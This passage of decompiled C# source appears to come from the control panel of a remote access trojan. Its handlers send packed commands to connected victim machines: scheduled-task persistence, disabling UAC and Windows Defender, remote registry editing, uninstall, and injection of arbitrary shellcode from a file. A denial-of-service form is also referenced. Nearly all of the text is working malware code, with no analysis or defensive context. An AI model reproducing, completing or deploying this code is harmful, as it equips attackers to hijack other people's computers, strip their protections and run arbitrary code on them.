					Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00007600 File Offset: 0x00007600
		private void installSchtaskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "autoschtaskinstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "InstallSchtask:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, false));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000098 RID: 152 RVA: 0x000077B4 File Offset: 0x000077B4
		private void disableUACToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableUAC:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00007968 File Offset: 0x00007968
		private void disableWDToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Extra.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "DisableDefedner:";
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				if (this.listView4.Items.Count > 0)
				{
					using (IEnumerator enumerator = this.listView4.Items.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							if (((ListViewItem)enumerator.Current).Text == listViewItem.Text)
							{
								return;
							}
						}
					}
				}
				Program.form1.listView4.Items.Add(listViewItem);
				Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				Form1.getTasks.Add(new AsyncTask(msgPack2.Encode2Bytes(), listViewItem.ToolTipText, true));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00007B1C File Offset: 0x00007B1C
		private void ConnectTimeout_Tick(object sender, EventArgs e)
		{
			Clients[] allClients = this.GetAllClients();
			if (allClients.Length != 0)
			{
				foreach (Clients clients in allClients)
				{
					if (Methods.DiffSeconds(clients.LastPing, DateTime.Now) > 20.0)
					{
						clients.Disconnected();
					}
				}
			}
		}

		// Token: 0x0600009B RID: 155 RVA: 0x00007B7C File Offset: 0x00007B7C
		private void remoteRegeditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Regedit.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormRegistryEditor)Application.OpenForms["remoteRegedit:" + clients.ID] == null)
					{
						new FormRegistryEditor
						{
							Name = "remoteRegedit:" + clients.ID,
							Text = "remoteRegedit:" + clients.ID,
							ParentClient = clients,
							F = this
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00007C88 File Offset: 0x00007C88
		private void normalInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "normalinstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00007D6C File Offset: 0x00007D6C
		private void normalUninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.listView1.SelectedItems.Count > 0)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = this.GetSelectedClients();
					for (int i = 0; i < selectedClients.Length; i++)
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00007E50 File Offset: 0x00007E50
		private void justForFunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Fun.dll");
				foreach (Clients clients in this.GetSelectedClients())
				{
					if ((FormFun)Application.OpenForms["fun:" + clients.ID] == null)
					{
						new FormFun
						{
							Name = "fun:" + clients.ID,
							Text = "fun:" + clients.ID,
							F = this,
							ParentClient = clients
						}.Show();
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00007F5C File Offset: 0x00007F5C
		private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using (OpenFileDialog openFileDialog = new OpenFileDialog())
				{
					openFileDialog.Multiselect = false;
					openFileDialog.Filter = "(*.bin)|*.bin";
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").AsString = "Shellcode";
						msgPack.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
						MsgPack msgPack2 = new MsgPack();
						msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
						msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Miscellaneous.dll");
						msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
						Clients[] selectedClients = this.GetSelectedClients();
						for (int i = 0; i < selectedClients.Length; i++)
						{
							ThreadPool.QueueUserWorkItem(new WaitCallback(selectedClients[i].Send), msgPack2.Encode2Bytes());
						}
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x0000808C File Offset: 0x0000808C
		private void noSystemToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "nosystem";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("bin\\Options.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				foreach (Clients clients in this.GetSelectedClients())
				{
					if (clients.LV.SubItems[this.lv_user.Index].Text.ToLower() == "system")
					{
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x04000020 RID: 32
		private bool trans;

		// Token: 0x04000021 RID: 33
		public cGeoMain cGeoMain = new cGeoMain();

		// Token: 0x04000022 RID: 34
		public static List<AsyncTask> getTasks = new List<AsyncTask>();

		// Token: 0x04000023 RID: 35
		private ListViewColumnSorter lvwColumnSorter;

		// Token: 0x04000024 RID: 36
		private readonly FormDOS formDOS;
	}
}
